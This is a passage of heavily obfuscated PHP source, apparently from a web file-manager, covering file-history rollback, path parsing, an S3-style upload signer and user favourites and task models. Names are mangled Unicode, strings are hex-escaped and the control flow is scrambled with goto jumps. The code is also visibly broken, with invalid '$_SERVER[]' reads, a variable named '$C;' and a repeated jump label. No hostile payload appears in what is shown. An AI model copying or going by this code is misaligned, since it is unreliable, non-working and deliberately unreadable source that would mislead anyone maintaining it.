(count($Eك) > $dЍۊ) { $a¸ = array_slice($Eك, $dЍۊ); foreach ($a¸ as $Fм) { IO::remove($C[$E鰌[1128]] . $Fм[$E鰌[28]]); } $Eك = array_slice($Eك, 0, $dЍۊ); } goto Cѻ; Cѻ: return self::saveData($C[$E鰌[1129]], $Eك); goto Fƅ֦; f: $E鰌 =& $_SERVER[]; $C = self::listData($Cڞɽ); if (!$C) { return; } goto a; AƯ: $Eك = $C[$E鰌[365]]; if ($A酭[$E鰌[77]] == 0) { return; } if ($A酭[$E鰌[77]] >= 1024 * 1024 * 500) { return !1; } goto cƟޑ; cƟޑ: if ($Eك && $Eك[0][$E鰌[170]] == $Cᆘ) { return !0; } if (array_key_exists($E鰌[194], $A酭) && !$A酭[$E鰌[194]]) { return !1; } $b = short_id(time()); goto DɄ; Fƅ֦: } public static function remove($a弌, $F) { $cɹҼ =& $_SERVER[]; $dެ = self::listData($a弌); $a㇅ = array(); if (!$dެ) { return !1; } foreach ($dެ[$cɹҼ[365]] as $bů) { if ($bů[$cɹҼ[388]] == $F) { IO::remove($dެ[$cɹҼ[1128]] . $bů[$cɹҼ[28]]); continue; } $a㇅[] = $bů; } return self::saveData($dެ[$cɹҼ[1129]], $a㇅); } public static function clear($cؑ׻, $b = true) { $cғ =& $_SERVER[]; $fڊ = self::listData($cؑ׻, $b); if (!$fڊ) { return !1; } foreach ($fڊ[$cғ[365]] as $Fڞؾ) { IO::remove($fڊ[$cғ[1128]] . $Fڞؾ[$cғ[28]]); } return self::saveData($fڊ[$cғ[1129]], array()); } public static function moveHistory($Fϊ, $c･ = '', $c = '') { goto e; e: $Fފ =& $_SERVER[]; $A = self::listData($Fϊ, !1); if (!$A || !$A[$Fފ[365]]) { return !1; } goto BǴ; Fܖ: self::saveData($A[$Fފ[1129]], $A[$Fފ[365]]); self::clearEmptyFolder($A[$Fފ[1128]]); goto aȪ; BǴ: $b = $Fފ[1116]; $c･ = $c･ ? $c･ : get_path_this($Fϊ); $c = $c ? $c : $A[$Fފ[1128]]; goto D; D: $b҅ = substr(get_path_this($A[$Fފ[1129]]), 0, -strlen($b)); foreach ($A[$Fފ[365]] as $D => $b) { $C쑣 = $c･ . substr($b[$Fފ[28]], strlen($b҅)); $Eߨ = IO::move($A[$Fފ[1128]] . $b[$Fފ[28]], $c, !1, $C쑣); if ($Eߨ) { $A[$Fފ[365]][$D][$Fފ[28]] = $C쑣; } } $A[$Fފ[1129]] = IO::move($A[$Fފ[1129]], $c, !1, $c･ . $b); goto Fܖ; aȪ: } public static function rollback($d܎, $C甽) { $aӂ =& $_SERVER[]; $fٵ = self::listData($d܎); if (!$fٵ) { return; } $Cҭ = IO::info($d܎); foreach ($fٵ[$aӂ[365]] as $D => $A≉) { if ($A≉[$aӂ[388]] == $C甽) { self::add($d܎); $Bü = $fٵ[$aӂ[1128]] . $A≉[$aӂ[28]]; $dӴ = IO::copy($Bü, IO::pathFather($d܎), REPEAT_REPLACE, $Cҭ[$aӂ[28]]); if ($dӴ) { self::remove($d܎, $C甽); } return $dӴ; } } return !1; } public static function setDetail($D֏ѡ, $A, $BŽꮖ) { $bɂ =& $_SERVER[]; $dҡ = self::listData($D֏ѡ); if (!$dҡ) { return; } foreach ($dҡ[$bɂ[365]] as $cȍ => $DэЏ) { if ($DэЏ[$bɂ[388]] == $A) { $dҡ[$bɂ[365]][$cȍ][$bɂ[1127]] = $BŽꮖ; self::saveData($dҡ[$bɂ[1129]], $dҡ[$bɂ[365]]); return !0; } } return !1; } public static function fileInfo($E􇬎, $f) { goto eƪ; AȌ: return IO::info($bæ); goto AȚ; eƪ: $A =& $_SERVER[]; $Fވϫ = self::listData($E􇬎); if (!$Fވϫ) { show_json(LNG($A[104]), !1); } goto CΧ; CΧ: $bæ = $A[33]; foreach ($Fވϫ[$A[365]] as $aΊޞ => $a) { if ($a[$A[388]] != $f) { continue; } $bæ = $Fވϫ[$A[1128]] . $a[$A[28]]; break; } if (!$bæ) { show_json(LNG($A[104]), !1); } goto AȌ; AȚ: } public static function fileOut($cǭ, $bʾՍ, $Eኌ = false) { $aڹ卌 =& $_SERVER[]; $Dԇ = self::fileInfo($cǭ, $bʾՍ); $bћݍ =& $GLOBALS[$aڹ卌[7]]; $Eኌ = isset($bћݍ[$aڹ卌[1093]]) && $bћݍ[$aڹ卌[1093]] == 1; if (isset($bћݍ[$aڹ卌[29]]) && $bћݍ[$aڹ卌[29]] == $aڹ卌[1130]) { return IO::fileOutImage($Dԇ[$aڹ卌[75]], $bћݍ[$aڹ卌[1131]]); } IO::fileOut($Dԇ[$aڹ卌[75]], $Eኌ, get_path_this($cǭ)); } public static function listData($b⻸, $aƯ = true) { goto DŅȳ; CΏ: $Dɮ = IO::getContent($fӚ[$a[1129]]); if ($Dɮ) { $b = json_decode($Dɮ, !0); if (is_array($b)) { $fӚ[$a[365]] = $b; } } return $fӚ; goto D; cĆ: if (substr($b⻸, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $fǚ = self::pathHistory($b⻸); $fӚ = array($a[1129] => $fǚ . $a[1116], $a[1128] => rtrim(get_path_father($fǚ), $a[8]) . $a[8], $a[365] => array()); goto CΏ; DŅȳ: $a =& $_SERVER[]; if ($aƯ && !IO::exist($b⻸)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto cĆ; D: } private static function saveData($D, $F彩) { goto c; c: $f혉 =& $_SERVER[]; self::log($f혉[1132] . $D . $f혉[67] . count($F彩), $f혉[727]); if ($F彩) { return IO::setContent($D, json_encode($F彩)); } goto cك; cك: $fŅ = IO::pathFather($D); IO::remove($D); self::clearEmptyFolder($fŅ); goto c; c: return !0; goto Bɚӷ; Bɚӷ: } public static function clearEmptyFolder($DĢ) { goto C; cǩ괝: self::clearEmptyFolder($Eߧ); goto BԵ; C: $Dĳʓ =& $_SERVER[]; if (trim($DĢ, $Dĳʓ[8]) == trim(self::$_historyBase, $Dĳʓ[8])) { return; } $Eߧ = IO::pathFather($DĢ); goto Fȹ; Fȹ: $cܤɌ = IO::has($DĢ, !0); if ($cܤɌ[$Dĳʓ[201]] > 0 || $cܤɌ[$Dĳʓ[202]] > 0) { return; } IO::remove($DĢ); goto cǩ괝; BԵ: } private static function getBasePath() { goto e¨; e¨: $f =& $_SERVER[]; $bǥ = Model($f[1133])->get($f[1134]); if (IO::exist($bǥ)) { return $bǥ; } goto C𧭈; C𧭈: $bǥ = DATA_PATH . $f[1135]; $bǥ = IO::mkdir($bǥ); $bǥ = rtrim($bǥ, $f[8]) . $f[8]; goto f줗ǔ; f줗ǔ: file_put_contents($bǥ . $f[1136], $f[33]); Model($f[1133])->set($f[1134], $bǥ); return $bǥ; goto Fܶ; Fܶ: } } class KodIO { const KOD_SOURCE = "\x7b\163\x6f\165\162\143\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\162\122\145\143\x79\143\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\165\x73\x65\x72\x46\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\145\x72\x46\x69\x6c\145\124\x61\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\165\163\145\x72\x46\x69\x6c\x65\x54\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\x6f\165\160\122\x6f\157\x74\x53\145\x6c\146\x7d"; const KOD_USER_SHARE = "\173\165\x73\145\x72\x53\x68\x61\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\x65\x72\x53\x68\141\x72\145\114\151\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\x61\x72\145\124\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\141\162\145\x49\164\x65\155\175"; const KOD_SHARE_LINK = "\173\x73\x68\141\x72\x65\111\164\145\x6d\114\x69\x6e\153\x7d"; const KOD_SEARCH = "\x7b\163\x65\x61\162\x63\x68\x7d"; const KOD_BLOCK = "\173\142\154\x6f\143\x6b\175"; const KOD_IO = "\x7b\151\x6f\175"; const KOD_USER_RECENT = "\173\x75\x73\x65\162\x52\x65\156\143\x65\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\144\x72\151\x76\145\x72\175"; public static function typeList() { $F =& $_SERVER[]; return array($F[1137] => self::KOD_SOURCE, $F[1138] => self::KOD_USER_RECYCLE, $F[1139] => self::KOD_USER_FAV, $F[1140] => self::KOD_USER_FILE_TAG, $F[1141] => self::KOD_USER_FILE_TYPE, $F[1142] => self::KOD_GROUP_ROOT_SELF, $F[1143] => self::KOD_USER_SHARE, $F[1144] => self::KOD_USER_SHARE_LINK, $F[1145] => self::KOD_USER_SHARE_TO_ME, $F[1146] => self::KOD_SHARE_ITEM, $F[1147] => self::KOD_SHARE_LINK, $F[1148] => self::KOD_SEARCH, $F[1149] => self::KOD_BLOCK, $F[1150] => self::KOD_IO, $F[1151] => self::KOD_USER_RECENT, $F[1152] => self::KOD_USER_DRIVER); } public static function parse($Bԉ԰) { goto BČ; cЙ: preg_match($eߎ[1153], $Bԉ԰, $d); $BͲ葠 = array($eߎ[409] => !1, $eߎ[1154] => !1, $eߎ[406] => !1, $eߎ[75] => $Bԉ԰, $eߎ[1064] => !1, $eߎ[1063] => $eߎ[33]); if (is_array($d) && count($d) == 5) { $AɂѺ = $eߎ[1155] . $d[2] . $eߎ[323]; if (in_array($AɂѺ, $e؂)) { $BͲ葠[$eߎ[1064]] = $d[1]; $BͲ葠[$eߎ[29]] = $AɂѺ; $BͲ葠[$eߎ[1156]] = substr($AɂѺ, 1, -1); $BͲ葠[$eߎ[388]] = $d[3]; } $BͲ葠[$eߎ[1063]] = $d[4]; } goto Dݱ; BČ: $eߎ =& $_SERVER[]; $Bԉ԰ = self::clear($Bԉ԰); $e؂ = array_values(self::typeList()); goto cЙ; Dݱ: $F = array($eߎ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $BͲ葠[$eߎ[1118]] = in_array($BͲ葠[$eߎ[29]], $F); return $BͲ葠; goto dߒ휿; dߒ휿: } public static function isTruePath($bϞ) { goto E; B銚: if (strpos($bϞ, $Aҧ[1121]) === 0) { return !0; } if (strpos($bϞ, $Aҧ[1157]) === 0) { return !0; } if (strpos($bϞ, $Aҧ[1157]) === 0) { return !0; } goto dº; dº: if (strpos($bϞ, $Aҧ[1158]) === 0) { return !0; } return !1; goto f; E: $Aҧ =& $_SERVER[]; if (substr($bϞ, 0, 1) != $Aҧ[1155]) { return !0; } if (strpos($bϞ, $Aҧ[395]) === 0) { return !0; } goto B銚; f: } public static function clear($B܊) { goto Fӊ; BɊ: $B܊ = preg_replace($bȂ[1161], $bȂ[8], $B܊); if ($B܊ == $bȂ[8]) { return $bȂ[8]; } $B܊ = rtrim($B܊, $bȂ[8]); goto eа; eа: return $B܊; goto dԄ; bʜ: $E = $bȂ[1159]; if (substr($B܊, 0, 3) == $bȂ[1160]) { $B܊ = substr($B܊, 3); } while (strstr($B܊, $E)) { $B܊ = str_replace($E, $bȂ[8], $B܊); } goto BɊ; Fӊ: $bȂ =& $_SERVER[]; $B܊ = str_replace(array($bȂ[1037], $bȂ[227]), $bȂ[50], $B܊); $B܊ = str_replace($bȂ[96], $bȂ[8], $B܊); goto bʜ; dԄ: } public static function sourceID($a) { $Cȶ =& $_SERVER[]; $e = self::parse($a); if ($e[$Cȶ[29]] !== self::KOD_SOURCE) { show_json(LNG($Cȶ[1162]), !1); } return $e[$Cȶ[388]]; } public static function make($fٍ) { if (!$fٍ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($fٍ)); } public static function makeShare($b, $F) { return self::makePath(self::KOD_SHARE_ITEM, $b, $F); } public static function makeFileTypePath($D։) { return self::makePath(self::KOD_USER_FILE_TYPE, $D։); } public static function makeFileTagPath($aڑӂ) { return self::makePath(self::KOD_USER_FILE_TAG, $aڑӂ); } public static function makePath($eЖ, $f׆چ = '', $Bգć = '') { $eܑ =& $_SERVER[]; $cÛ = substr($eЖ, 1, -1); $eҥ = $eܑ[1163] . $cÛ . $eܑ[1164] . $f׆چ . $eܑ[1165]; $eҥ = $Bգć ? $eҥ . $Bգć . $eܑ[8] : $eҥ; return $eҥ; } public static function hashPath($cد؜) { $F =& $_SERVER[]; $cţ豷 = is_array($cد؜) ? $cد؜ : IO::info($cد؜); $fɗ = _get($cţ豷, $F[1166], $F[33]); if (!$fɗ) { $Dɚ = KodIO::parse($cţ豷[$F[75]]); if (!$Dɚ[$F[29]]) { $fɗ = IO::hashSimple($cţ豷[$F[75]]); } } if (!$fɗ) { $fɗ = md5($cţ豷[$F[75]] . $cţ豷[$F[77]] . $cţ豷[$F[83]]); } return $fɗ; } public static function initSystemPath() { goto dҗ㛽; eЧ: define($EŅ᷄[1169], self::systemPath($EŅ᷄[1170])); define($EŅ᷄[1171], self::systemPath($EŅ᷄[1172])); define($EŅ᷄[1173], self::systemPath($EŅ᷄[1174])); goto dܛ; dܛ: IOHistory::bindEvent(); goto dڅ; dҗ㛽: $EŅ᷄ =& $_SERVER[]; if (defined($EŅ᷄[1167])) { return; } define($EŅ᷄[1167], self::systemPath($EŅ᷄[1168])); goto eЧ; dڅ: } public static function systemPath($a󳔛) { goto dͼ; dͼ: $f =& $_SERVER[]; $B = $f[1175] . ucfirst($a󳔛); $cɯܱ = Model($f[1123])->get($B); goto F; F: if ($cɯܱ) { return $cɯܱ; } if ($a󳔛 == $f[1168]) { $cɯܱ = self::make(Model($f[790])->systemRootPathAdd($f[500])); } else { $cɯܱ = self::systemPath($f[1168]); $F󯖇 = self::sourceID($cɯܱ); $cɯܱ = self::make(Model($f[790])->mkdir($F󯖇, $a󳔛)); } Model($f[1123])->set($B, $cɯܱ); goto b莈; b莈: return $cɯܱ; goto Aü; Aü: } public static function systemFolder($d䗕ً) { $b؃ = IO_PATH_SYSTEM_SOURCE . $d䗕ً; $Cք = Cache::get($b؃); if (!$Cք) { $eƪ = IO::infoFull($b؃); if (!$eƪ) { $Cք = IO::mkdir($b؃, REPEAT_SKIP); } else { $Cք = $eƪ[$_SERVER[][75]]; } Cache::set($b؃, $Cք, 3600 * 10); } return $Cք; } public static function defaultDriver() { return Model($_SERVER[][739])->defaultDriver(); } public static function defaultIO() { $Bݗ֝ƙ =& $_SERVER[]; $cض = self::defaultDriver(); return $Bݗ֝ƙ[1176] . $cض[$Bݗ֝ƙ[388]] . $Bݗ֝ƙ[1165]; } public static function defaultDriverInit() { static $BɆ = false; if ($BɆ) { return $BɆ; } $BɆ = IO::init(self::defaultIO()); return $BɆ; } public static function fileTypeList() { $FȮ =& $_SERVER[]; $cɿه = $GLOBALS[$FȮ[6]][$FȮ[1177]]; foreach ($cɿه as $B => $c΍) { $c˄ȓܼ = $FȮ[1178] . $B; $cо = LNG($c˄ȓܼ); if ($c˄ȓܼ != $cо) { $cɿه[$B][$FȮ[28]] = $cо; } } return $cɿه; } public static function transferType($EΧ, $BԤ) { goto Aľ; Aľ: $eϻ =& $_SERVER[]; $EֵûЃ = self::driverType($EΧ); $D = self::driverType($BԤ); goto D펬; D펬: if ($EֵûЃ[$eϻ[29]] == $D[$eϻ[29]] && $EֵûЃ[$eϻ[1179]] == $D[$eϻ[1179]]) { return $eϻ[1180]; } if ($EֵûЃ[$eϻ[29]] == $eϻ[831] && $D[$eϻ[29]] == $eϻ[105]) { return $eϻ[1093]; } if ($EֵûЃ[$eϻ[29]] == $eϻ[105] && $D[$eϻ[29]] == $eϻ[831]) { return $eϻ[106]; } goto c; c: return $eϻ[1181]; goto fÎً; fÎً: } public static function driverType($e) { goto Bۓ; Bۓ: $B =& $_SERVER[]; $b젍ݼ = $e->path; $eܠ = str_replace($B[1182], $B[33], strtolower($e->getType())); goto Bү; A: return array($B[29] => $B[831], $B[1179] => $e->pathDriver, $B[75] => $b젍ݼ); goto cݏ; Bү: if ($eܠ == $B[730] || $eܠ == $B[1183] || $eܠ == $B[1184]) { $e = self::defaultDriverInit(); } else { if ($eܠ == $B[1100] || $eܠ == $B[1185]) { $e = IO::init($e->pathParse[$B[1047]]); } } $eܠ = str_replace($B[1182], $B[33], strtolower($e->getType())); if ($eܠ == $B[105]) { return array($B[29] => $B[105], $B[1179] => $B[33], $B[75] => $b젍ݼ); } goto A; cݏ: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Ë́) { parent::__construct($Ë́); $this->signatureVersion($_SERVER[][210]); } public function uploadFormData($cի駆, $bΓ͟ = 3600) { goto e; e: $e؅ =& $_SERVER[]; $d׌ʚ = $e؅[191]; $BĤ = $e؅[228]; goto bč; bč: $bȼʧ = $e؅[1186]; $d𑫸 = gmdate($e؅[1187], time() + $bΓ͟); $aڹ = (string) time() . $e؅[67] . (string) (time() + $bΓ͟); goto e׸; e׸: $dː = array($e؅[1188] => $d𑫸, $e؅[1189] => array(array($e؅[1190] => $d׌ʚ), array($e؅[1191] => $this->bucket), array($e؅[1192], $e؅[1193], $e؅[33]), array($e؅[1194] => $bȼʧ), array($e؅[1195] => $BĤ), array($e؅[1196] => $this->accessKey), array($e؅[1197] => $aڹ))); $dː = json_encode($dː); $B뱂Т = hash_hmac($e؅[228], $aڹ, $this->secret); goto BԼ; fή: return $fȝ; goto Bɚ; BԼ: $eۮ = sha1($dː); $f׫ = hash_hmac($e؅[228], $eۮ, $B뱂Т); $fȝ = array($e؅[1190] => $d׌ʚ, $e؅[1194] => $bȼʧ, $e؅[1198] => base64_encode($dː), $e؅[1195] => $BĤ, $e؅[1196] => $this->accessKey, $e؅[1199] => $aڹ, $e؅[1200] => $f׫, $e؅[175] => $this->getHost()); goto fή; Bɚ: } public function fileOutLink($C;) { $F̭ =& $_SERVER[]; if (substr($C;, 0, 7) == $F̭[1201]) { $C; = $F̭[1202] . substr($C;, 7); } header($F̭[158] . $C;); die; } } goto A; aƊ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\x74\141\x73\x6b\x4c\x69\x73\164"; public $field = array("\x6e\141\155\145", "\x74\171\160\145", "\x65\x76\145\156\164", "\x74\151\x6d\145", "\x64\145\163\143", "\x73\171\163\x74\x65\x6d", "\x65\x6e\141\x62\154\145", "\x6c\x61\x73\x74\x52\x75\x6e", "\163\x6f\x72\x74"); public function listData($bأ = false, $ağ = "\x73\157\x72\x74", $E = false) { return parent::listData($bأ, $ağ, $E); } public function add($e) { $eԹ =& $_SERVER[]; $Cѐʉ = $this->findByName($e[$eԹ[28]]); if ($Cѐʉ) { return !1; } $e[$eԹ[1487]] = 0; $e[$eԹ[1709]] = $this->getSort(); return parent::insert($e); } private function getSort() { $Aӯ =& $_SERVER[]; $d = parent::listData(); $cŮΡ = array_to_keyvalue($d, $Aӯ[33], $Aӯ[1709]); return empty($cŮΡ) ? 0 : max($cŮΡ) + 1; } public function update($bޛ, $cį) { $aǬѮ =& $_SERVER[]; $aغ = $this->listData($bޛ); $a񻾱 = $this->findByName($cį[$aǬѮ[28]]); if (!$aغ || $a񻾱 && $a񻾱[$aǬѮ[388]] != $aغ[$aǬѮ[388]]) { return !1; } return parent::update($bޛ, $cį); } public function remove($bȠ, $Bϕ𨻱 = false) { $C =& $_SERVER[]; $bɄ = $this->listData($bȠ); if (!$bɄ) { return; } if (!$Bϕ𨻱 && $bɄ[$C[1168]] == $C[86]) { return !1; } return parent::remove($bȠ); } public function enable($Eх, $EƤҡ) { return $this->update($Eх, array($_SERVER[][2091] => $EƤҡ)); } public function run($c⬰) { return $this->update($c⬰, array($_SERVER[][2101] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\141\166"; protected function cacheFunctionAlias($cǆ) { $e =& $_SERVER[]; return array($e[1789] => array(USER_ID, $e[2102])); } protected function listData() { $c٢ =& $_SERVER[]; $c˭ڠ = array($c٢[1515] => USER_ID, $c٢[457] => 0); $Eл = $c٢[2103]; $b = $this->field($Eл)->where($c˭ڠ)->order($c٢[2104])->select(); return $b ? $b : array(); } protected function resetCache() { } protected function listView() { goto a݂; d: $E׉ = array_to_keyvalue($Cř۫, $Dە[33], $Dە[75]); if (!$E׉) { return $Aټ; } $A = 2000; goto E; F: $cؤ = array_to_keyvalue($cؤ, $Dە[390]); foreach ($Aټ as $B炶 => $Aݪْ) { $E = $cؤ[$Aݪْ[$Dە[75]]]; $E = $E ? $E : array(); $Aټ[$B炶] = array_merge($E, $Aݪْ); } return $Aټ; goto E; E: $eǅ = array($Dە[404] => array($Dە[405], $E׉)); $cؤ = Model($Dە[790])->listSource($eǅ, $A); $cؤ = array_merge($cؤ[$Dە[73]], $cؤ[$Dە[74]]); goto F; a݂: $Dە =& $_SERVER[]; $Aټ = $this->listData(); $Cř۫ = array_filter_by_field($Aټ, $Dە[29], $Dە[403]); goto d; E: } protected function addFav($D叛ɷ, $F = '', $c㯨Ǐ = "\163\x6f\165\x72\x63\x65") { goto cԵク; cԵク: $b߶ =& $_SERVER[]; $CƠ = array($b߶[1515] => USER_ID, $b߶[457] => 0, $b߶[409] => $c㯨Ǐ, $b߶[408] => $D叛ɷ); if ($this->where($CƠ)->find()) { return !1; } goto c۝; c۝: $CƠ = array($b߶[1515] => USER_ID, $b߶[457] => 0); $F = $this->where($CƠ)->max($b߶[1709]); if (!$F) { $F = 0; } goto Eៅ; Eߩ: return $this->add($C㤼); goto A᧕; Eៅ: if (!$F && $c㯨Ǐ == $b߶[403]) { $dЄ = Model($b߶[1203])->where(array($b߶[404] => $D叛ɷ))->find(); if (!$dЄ) { return !1; } $F = $dЄ[$b߶[28]]; } $F = $this->getAutoName($F); $C㤼 = array($b߶[1515] => USER_ID, $b߶[457] => 0, $b߶[407] => $F, $b߶[408] => $D叛ɷ, $b߶[409] => $c㯨Ǐ, $b߶[1690] => $F + 1); goto Eߩ; A᧕: } protected function remove($dܐ) { $bԡ =& $_SERVER[]; $a = array($bԡ[1515] => USER_ID, $bԡ[406] => $dܐ); return $this->where($a)->delete(); } protected function removeByName($DӰ) { $aļ =& $_SERVER[]; $EՆ = array($aļ[1515] => USER_ID, $aļ[407] => $DӰ, $aļ[457] => 0); return $this->where($EՆ)->delete(); } protected function rename($Fţ, $d͡蟰) { $F̳ =& $_SERVER[]; if ($Fţ == $d͡蟰) { return !1; } $AǾɦ = $this->getAutoName($d͡蟰); if ($d͡蟰 != $AǾɦ) { return !1; } $e = array($F̳[1515] => USER_ID, $F̳[457] => 0, $F̳[28] => $Fţ); return $this->where($e)->save(array($F̳[28] => $d͡蟰)); } protected function resetSort($bύ) { $d =& $_SERVER[]; $bύ = is_array($bύ) ? $bύ : array(); $A = array($d[1515] => USER_ID); for ($a蚜 = 0; $a蚜 < count($bύ); $a蚜++) { $A[$d[406]] = $bύ[$a蚜]; $this->where($A)->save(array($d[1690] => $a蚜 + 1)); } return !0; } protected function moveTop($eт÷) { goto fܪ; e뻍: $B = $D; $D = array_remove_value($D, $Eɭ[$b[388]]); array_unshift($D, $Eɭ[$b[388]]); goto FƮ; a: if (!$Eɭ) { return; } $D = $this->field($b[388])->where($A)->order($b[2104])->select(); $D = array_to_keyvalue($D, $b[33], $b[388]); goto e뻍; fܪ: $b =& $_SERVER[]; $A = array($b[1515] => USER_ID, $b[457] => 0); $Eɭ = $this->where($A)->where(array($b[28] => $eт÷))->find(); goto a; FƮ: return $this->resetSort($D); goto b; b: } protected function moveBottom($bǢ) { $eθ =& $_SERVER[]; $Dϧ = array($eθ[1515] => USER_ID, $eθ[457] => 0); $a¶ = $this->where($Dϧ)->max($eθ[1709]); $F͕ = array($eθ[1709] => $a¶ + 1); return $this->where($Dϧ)->where(array($eθ[28] => $bǢ))->save($F͕); } private function getAutoName($Fԫʨ) { goto dɘ; B۽: return $Fԫʨ . "\x28{$F}\51"; goto fݔ; aϜ: $a» = array_to_keyvalue($a», $f[33], $f[28]); if (!$a» || !in_array($Fԫʨ, $a»)) { return $Fԫʨ; } for ($F = 0; $F < count($a»); $F++) { if (!in_array($Fԫʨ . "\x28{$F}\51", $a»)) { return $Fԫʨ . "\x28{$F}\x29"; } } goto B۽; dɘ: $f =& $_SERVER[]; $B֙ = array($f[1515] => USER_ID, $f[457] => 0); $a» = $this->field($f[28])->where($B֙)->select(); goto aϜ; fݔ: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\152\x6f\x62\x4c\151\163\164"; public $field = array("\156\x61\155\145", "\144\145\x73\x63", "\163\157\162\x74"); const JOB_KEY = "\x73\x65\154\x66\112\157\x62\x4c\151\x73\x74"; public function listData($a = false, $c = "\163\x6f\162\164", $EϞ = false) { return parent::listData($a, $c, $EϞ); } public function remove($F) { return parent::remove($F); } public function add($cȜ) { $d =& $_SERVER[]; if ($this->findByName($cȜ[$d[28]])) { return !1; } $cȜ[$d[1709]] = $this->getSort(); return parent::insert($cȜ); } private function getSort() { $B툧 =& $_SERVER[]; $fӷ = parent::listData(); $F͎ = array_to_keyvalue($fӷ, $B툧[33], $B툧[1709]); return empty($F͎) ? 0 : max($F͎) + 1; } public function update($E냢, $EҶ) { $Eٰ =& $_SERVER[]; $d = parent::listData($E냢); $F = $this->findByName($EҶ[$Eٰ[28]]); if (!$d || $F && $F[$Eٰ[388]] != $d[$Eٰ[388]]) { return !1; } return parent::update($E냢, $EҶ); } public function setUserJob($Eռ, $D) { goto FҪˏ֊; Dԏ: $F = rtrim($F, $D[47]); Model($D[501])->metaSet($Eռ, self::JOB_KEY, $F); goto Cנ; cñ: $F = array_to_keyvalue($Dг, $D[28]); $F = $D[373]; foreach ($D as $aƻǏ) { if ($F[$aƻǏ]) { $F .= $F[$aƻǏ][$D[388]] . $D[47]; } else { $A׭ = $this->add($aƻǏ); $F .= $A׭ . $D[47]; } } goto Dԏ; FҪˏ֊: $D =& $_SERVER[]; if (!is_array($D)) { $D = array($D); } $Dг = parent::listData(); goto cñ; Cנ: } public function getUserJob($eŜ) { $DǨ = Model($_SERVER[][501])->metaGet($eŜ); return $this->getUserJobInfo($DǨ[self::JOB_KEY]); } public function getUserJobInfo($Cݩ) { goto f; dƞ: $f挮 = array_remove_key($f挮, $CБ[192]); $c˅߈ = array(); foreach ($aƾ as $c󩶰) { if (isset($f挮[$c󩶰])) { $c˅߈[] = $f挮[$c󩶰]; } } goto E꿆ǡ; E꿆ǡ: return $c˅߈; goto Eץ; f: $CБ =& $_SERVER[]; $aƾ = explode($CБ[47], $Cݩ); $f挮 = parent::listData(); goto dƞ; Eץ: } } goto cĈ벚; A: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($A§) { $this->pathParse = $A§; $this->model = Model($_SERVER[][1203]); } public function getPath($d) { return trim($d, $_SERVER[][8]); } public function pathFather($B) { $D鱲 = $this->parse($B); $D鱲 = $this->infoSimple($B); return $D鱲 ? $D鱲[$_SERVER[][472]] : !1; } public function pathThis($e𽊆) { $c߷ = $this->infoSimple($e𽊆); return $c߷ ? $c߷[$_SERVER[][28]] : !1; } public function getPathOuter($B㈟強) { if (!$B㈟強) { return $B㈟強; } $eۋ = $this->parse($B㈟強); return KodIO::make($eۋ[$_SERVER[][388]]); } public function copyFolderFromIO($f, $Bɘ, $a߮, $eר, $b) { $aجׯ = $this->model->copyFolderFromIO($f, $Bɘ, $a߮, $eר, $b); return KodIO::make($aجׯ); } public function isParentOf($f, $fՊ) { return $this->model->isParentOf($f, $fՊ); } public function mkfile($BӅ, $e = '', $b = REPEAT_RENAME) { $Bą텕 =& $_SERVER[]; $c鸛 = $this->parse($BӅ); $BӅ = $c鸛[$Bą텕[388]]; for ($AѶ = 0; $AѶ < count($c鸛[$Bą텕[1204]]); $AѶ++) { $f̠ȕ = $c鸛[$Bą텕[1204]][$AѶ]; if ($AѶ == count($c鸛[$Bą텕[1204]]) - 1) { $BӅ = $this->model->mkfile($BӅ, $f̠ȕ, $e, $b); break; } $BӅ = $this->model->mkdir($BӅ, $f̠ȕ, REPEAT_SKIP); } return $this->getPathOuter($BӅ); } public function mkdir($aő, $AϹ = REPEAT_SKIP) { $e =& $_SERVER[]; $að = $this->parse($aő); $aő = $að[$e[388]]; for ($cϏ = 0; $cϏ < count($að[$e[1204]]); $cϏ++) { $aӭ = $að[$e[1204]][$cϏ]; $aő = $this->model->mkdir($aő, $aӭ, $AϹ); } return $this->getPathOuter($aő); } public function copyFile($a۽, $e׾, $f۲ = REPEAT_REPLACE) { $dڄﱫ =& $_SERVER[]; $F = $this->parse($e׾); $D = $this->model->copy($a۽, $F[$dڄﱫ[388]], $f۲, $F[$dڄﱫ[75]]); return $D ? $this->getPathOuter($D) : !1; } public function moveFile($fĽɉ, $F, $bҌ՞ = REPEAT_REPLACE) { $Aَ =& $_SERVER[]; $eΙƶ = $this->parse($F); $c։ = $this->model->move($fĽɉ, $eΙƶ[$Aَ[388]], $bҌ՞, $eΙƶ[$Aَ[75]]); return $c։ ? $this->getPathOuter($c։) : !1; } public function copy($FʾǸ, $bϤ, $f = REPEAT_REPLACE) { $Fʾ = $this->parse($bϤ); $C⦆ = $this->model->copy($FʾǸ, $Fʾ[$_SERVER[][388]], $f); return $C⦆ ? $this->getPathOuter($C⦆) : !1; } public function moveSameAllow() { } public function move($b, $Eԯ, $FȔ = REPEAT_REPLACE) { $eΉ = $this->parse($Eԯ); $D = $this->model->move($b, $eΉ[$_SERVER[][388]], $FȔ); return $D ? $this->getPathOuter($D) : !1; } public function remove($aΨ, $BӶ = true) { return $this->model->remove($aΨ, $BӶ); } public function rename($DɅ֗, $Dܟ) { $A҂ = $this->model->rename($DɅ֗, $Dܟ); return $A҂ ? $this->getPathOuter($DɅ֗) : $A҂; } public function size($E) { $Eý = $this->infoSimple($E); return $Eý ? 